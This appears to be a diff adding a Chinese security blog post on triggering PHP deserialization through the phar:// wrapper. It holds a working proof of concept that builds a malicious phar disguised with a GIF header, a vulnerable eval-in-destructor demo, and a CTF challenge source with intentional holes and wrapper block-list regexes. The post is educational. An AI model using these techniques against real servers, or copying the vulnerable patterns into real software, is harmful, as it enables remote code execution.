@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/boogle.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/boogle.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 背景在Blackhat2018，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it,利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。 0x01 原理漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phar 实现php反序列化">
+<meta property="og:url" content="http://yoursite.com/2018/11/24/phar-实现php反序列化/index.html">
+<meta property="og:site_name" content="Boogle&#39;s Blogs">
+<meta property="og:description" content="0x00 背景在Blackhat2018，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it,利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。 0x01 原理漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2018/11/24/5bf8bf760dcb3.png">
+<meta property="og:image" content="https://i.loli.net/2018/11/24/5bf8c47b68e73.png">
+<meta property="og:updated_time" content="2019-02-21T07:22:34.883Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phar 实现php反序列化">
+<meta name="twitter:description" content="0x00 背景在Blackhat2018，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it,利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。 0x01 原理漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象">
+<meta name="twitter:image" content="https://i.loli.net/2018/11/24/5bf8bf760dcb3.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/24/phar-实现php反序列化/">
+
+
+
+
+
+  <title>phar 实现php反序列化 | Boogle's Blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Boogle's Blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/24/phar-实现php反序列化/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phar 实现php反序列化</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-24T14:04:19+08:00">
+                2018-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>在Blackhat2018，安全研究员Sam Thomas分享了议题<strong>It’s a PHP unserialization vulnerability Jim, but not as we know it</strong>,利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。</p>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</li>
+</ul>
+<p>下面的函数可以利用<br><img src="https://i.loli.net/2018/11/24/5bf8bf760dcb3.png" alt></p>
+<h3 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">&lt;?php</span><br><span class="line">class foo</span><br><span class="line">&#123;</span><br><span class="line">    var $ha = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;ha);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ka = $_GET[&apos;file&apos;];</span><br><span class="line">file_exists($ka);</span><br></pre></td></tr></table></figure>
+<p>可以看到foo是一个危险函数，当危险的对象被反序列化时eval会导致命令执行。这里正好有一个file_exists的文件操作函数，为了测试方便，我们直接生成phar文件放在index.php所在目录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//构造phar文件的代码</span><br><span class="line">&lt;?php</span><br><span class="line">//把要进行反序列化的对象放在此处</span><br><span class="line">class foo</span><br><span class="line">&#123;</span><br><span class="line">    var $ha = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;ha);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    //生成对应可被利用的对象</span><br><span class="line">    $o = new foo();</span><br><span class="line">　　 $o-&gt;ha=&apos;echo &quot;hello boogle&quot;;&apos;;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头用以欺骗检测</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里因为调用了phar的setMetadata方法，所以需要设置php.ini中<strong>phar.readonly = Off </strong><br>而使用phar文件只需要(PHP 5 &gt;= 5.3.0, PHP 7, PECL phar &gt;= 1.0.0)即可。<br>这里生成的phar.phar可以修改为任意文件后缀，比如1.gif。<br>然后访问index.php，使用<strong>phar://</strong>读取<br><img src="https://i.loli.net/2018/11/24/5bf8c47b68e73.png" alt></p>
+<h2 id="0x03-CTF题"><a href="#0x03-CTF题" class="headerlink" title="0x03 CTF题"></a>0x03 CTF题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$SECRET  = `../read_secret`;                                   </span><br><span class="line">$SANDBOX = &quot;../data/&quot; . md5($SECRET. $_SERVER[&quot;REMOTE_ADDR&quot;]); </span><br><span class="line">$FILEBOX = &quot;../file/&quot; . md5(&quot;K0rz3n&quot;. $_SERVER[&quot;REMOTE_ADDR&quot;]);    </span><br><span class="line">@mkdir($SANDBOX); </span><br><span class="line">@mkdir($FILEBOX); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; </span><br><span class="line">    $data = serialize(new User($SANDBOX)); </span><br><span class="line">    $hmac = hash_hmac(&quot;md5&quot;, $data, $SECRET); </span><br><span class="line">    setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));       </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar = $path;                                           </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class K0rz3n_secret_flag &#123; </span><br><span class="line">    protected $file_path; </span><br><span class="line">    function __destruct()&#123; </span><br><span class="line">        if(preg_match(&apos;/(log|etc|session|proc|read_secret|history|class)/i&apos;, $this-&gt;file_path))&#123; </span><br><span class="line">            die(&quot;Sorry Sorry Sorry&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    include_once($this-&gt;file_path); </span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check_session() &#123; </span><br><span class="line">    global $SECRET; </span><br><span class="line">    $data = $_COOKIE[&quot;session-data&quot;]; </span><br><span class="line">    list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); </span><br><span class="line">    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; </span><br><span class="line">        die(&quot;Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    if ( !hash_equals(hash_hmac(&quot;md5&quot;, $data, $SECRET), $hmac) )&#123; </span><br><span class="line">        die(&quot;Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $data = unserialize($data); </span><br><span class="line"></span><br><span class="line">    if ( !isset($data-&gt;avatar) )&#123; </span><br><span class="line">        die(&quot;Bye Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    return $data-&gt;avatar;                                                </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($path) &#123; </span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123; </span><br><span class="line">         if(preg_match(&apos;/^(http|https).*/i&apos;, $_GET[&apos;url&apos;]))&#123; </span><br><span class="line">            $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);                                                                                     </span><br><span class="line">            if (substr($data, 0, 6) !== &quot;GIF89a&quot;)&#123; </span><br><span class="line">                die(&quot;Fuck off&quot;); </span><br><span class="line">            &#125; </span><br><span class="line">            file_put_contents($path . &quot;/avatar.gif&quot;, $data); </span><br><span class="line">            die(&quot;Upload OK&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Hacker&quot;); </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        die(&quot;Miss the URL~~&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function show($path) &#123; </span><br><span class="line">    if ( !is_dir($path) || !file_exists($path . &quot;/avatar.gif&quot;)) &#123; </span><br><span class="line"></span><br><span class="line">        $path = &quot;/var/www&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    header(&quot;Content-Type: image/gif&quot;); </span><br><span class="line">    die(file_get_contents($path . &quot;/avatar.gif&quot;));                      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check($path)&#123; </span><br><span class="line">    if(isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">        if(preg_match(&apos;/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i&apos;,$_GET[&apos;c&apos;]))&#123; </span><br><span class="line">            die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            $file_path = $_GET[&apos;c&apos;]; </span><br><span class="line">            list($width, $height, $type) = @getimagesize($file_path); </span><br><span class="line">            die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">                &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        list($width, $height, $type) = @getimagesize($path.&quot;/avatar.gif&quot;); </span><br><span class="line">        die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">            &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function move($source_path,$dest_name)&#123; </span><br><span class="line">    global $FILEBOX; </span><br><span class="line">    $dest_path = $FILEBOX . &quot;/&quot; . $dest_name; </span><br><span class="line">    if(preg_match(&apos;/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i&apos;,$source_path))&#123; </span><br><span class="line">        die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        if(copy($source_path,$dest_path))&#123; </span><br><span class="line">            die(&quot;Successful copy&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Copy failed&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mode = $_GET[&quot;m&quot;]; </span><br><span class="line"></span><br><span class="line">if ($mode == &quot;upload&quot;)&#123; </span><br><span class="line">     upload(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;show&quot;)&#123; </span><br><span class="line">    show(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;check&quot;)&#123; </span><br><span class="line">    check(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if($mode == &quot;move&quot;)&#123; </span><br><span class="line">    move($_GET[&apos;source&apos;],$_GET[&apos;dest&apos;]); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">include(&quot;./comments.html&quot;);</span><br></pre></td></tr></table></figure>
+<p>参考文章：<br><a href="https://www.cnblogs.com/iceli/p/9564061.html" target="_blank" rel="noopener">https://www.cnblogs.com/iceli/p/9564061.html</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/21/sql注入-服务端模板注入（SSTI）/" rel="next" title="sql注入 & 服务端模板注入（SSTI）">
+                <i class="fa fa-chevron-left"></i> sql注入 & 服务端模板注入（SSTI）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/26/regexp盲注/" rel="prev" title="regexp盲注">
+                regexp盲注 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">boogle</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-背景"><span class="nav-number">1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-原理"><span class="nav-number">2.</span> <span class="nav-text">0x01 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用条件"><span class="nav-number">3.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试demo"><span class="nav-number">3.2.</span> <span class="nav-text">测试demo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-CTF题"><span class="nav-number">4.</span> <span class="nav-text">0x03 CTF题</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">boogle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
